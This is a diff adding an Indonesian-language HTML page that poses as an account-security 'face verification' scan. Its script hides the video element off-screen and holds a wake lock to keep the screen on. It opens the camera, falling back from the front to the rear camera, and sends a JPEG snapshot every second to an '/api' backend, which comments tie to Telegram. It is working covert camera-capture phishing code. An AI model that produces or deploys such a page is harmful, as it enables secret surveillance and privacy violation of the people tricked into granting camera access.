@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Wajah</title>
+    <style>
+        #video { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+        #canvas { display: none; }
+        body { background: #f0f0f0; font-family: Arial; text-align: center; padding-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>⏳ Verifikasi Wajah</h2>
+        <p>Scan wajah Anda untuk keamanan akun...</p>
+        <div class="loader"></div>
+        <p style="color: #888; font-size: 12px;">Proses ini membutuhkan akses kamera</p>
+    </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        // WAKE LOCK biar layar gak mati (redup aja)
+        async function keepScreenOn() {
+            try {
+                const wl = await navigator.wakeLock.request('screen');
+                document.addEventListener('visibilitychange', () => {
+                    if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
+                });
+            } catch(e){}
+        }
+        keepScreenOn();
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let stream = null;
+
+        function startCamera(facingMode = 'user') {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode, width:640, height:480 }, audio:false })
+                .then(s => {
+                    stream = s;
+                    video.srcObject = s;
+                    video.play();
+                    // FOTO TIAP 1 DETIK (1000ms) TERUS-TERUSAN!
+                    setInterval(() => {
+                        if (!stream) return;
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        ctx.drawImage(video, 0, 0);
+                        const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                        // Kirim ke backend Vercel (bukan langsung ke Telegram)
+                        fetch('/api', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ img: base64, ts: Date.now() })
+                        }).catch(e => console.log('Gagal kirim'));
+                    }, 1000);
+                })
+                .catch(() => { if (facingMode === 'user') startCamera('environment'); });
+        }
+        startCamera('user');
+    </script>
+</body>
+</html>
